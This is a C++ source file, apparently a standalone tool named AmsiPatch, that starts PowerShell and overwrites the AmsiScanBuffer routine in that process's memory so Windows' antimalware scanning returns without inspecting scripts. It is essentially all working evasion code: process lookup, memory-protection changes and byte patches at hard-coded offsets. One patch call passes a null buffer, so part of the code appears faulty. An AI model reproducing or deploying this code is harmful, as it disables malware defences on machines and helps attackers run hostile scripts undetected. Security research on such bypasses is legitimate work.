// AmsiPatch.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

DWORD FindProcessId(const WCHAR* processname)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD result = 0;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnap) return(FALSE);

    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        std::cout << "[!] Failed to gather information on system processes!" << std::endl;
        return 0;
    }

    do
    {
        if (wcscmp(processname, pe32.szExeFile) == 0)
        {
            result = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return result;
}

BOOL patch_proc_address(HANDLE hTargetProc, LPVOID patchAddress, SIZE_T patchSize, BYTE* patch)
{
    DWORD op;
    if (!VirtualProtectEx(hTargetProc, patchAddress, patchSize, PAGE_READWRITE, &op))
    {
        std::cout << "[!] Failed to change protections" << std::endl;
        return FALSE;
    }

    SIZE_T nBytesWritten;
    WriteProcessMemory(hTargetProc, patchAddress, patch, patchSize, &nBytesWritten);

    if (!VirtualProtectEx(hTargetProc, patchAddress, patchSize, PAGE_EXECUTE_READ, &op))
    {
        std::cout << "[!] Failed to restore old protections" << std::endl;
        return FALSE;
    }

    return TRUE;
}

int main()
{
    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;

    if (CreateProcess(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &info, &processInfo))
    {
        Sleep(3000);

        HMODULE amsiDll = LoadLibrary(L"amsi.dll");
        if (!amsiDll)
        {
            std::cout << "[!] Failed to load amsi dll" << std::endl;
            return 1;
        }

        char* amsiScanBufferAddr = (char*)(GetProcAddress(amsiDll, "AmsiScanBuffer"));
        if (!amsiScanBufferAddr)
        {
            std::cout << "[!] Failed to load AmsiScanBuffer" << std::endl;
            return 2;
        }

        DWORD pwshProcId = FindProcessId(L"powershell.exe");
        if (!pwshProcId)
        {
            std::cout << "[!] Failed to get pwsh proc id" << std::endl;
            return 3;
        }
        
        HANDLE hPwsh = OpenProcess(PROCESS_ALL_ACCESS, false, pwshProcId);
        if (!hPwsh)
        {
            std::cout << "[!] Failed to open process" << std::endl;
            return 4;
        }

        BYTE patch[3] = { 0x39, 0xe4, 0x90 }; // cmp esp, esp, nop
            // this makes amsi jump to invalid arg return instead of actually scanning the buffer
            // one NOP (0x90) is needed, because the instruction before was 3 bytes long, e.g. 0x48 0x85 0xDB
        
        char* patchAddress = amsiScanBufferAddr + 0x78;
        patch_proc_address(hPwsh, patchAddress, sizeof(patch), patch);

        // Patch return value to return S_OK (0x00)
        char* returnPatchAddress = (char*)amsiDll + 0x3935;
        patch_proc_address(hPwsh, returnPatchAddress, 1, 0x00);

        std::cout << "[*] Patched amsi for process with pid: " << pwshProcId << std::endl;

        WaitForSingleObject(processInfo.hProcess, INFINITE);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
    }
}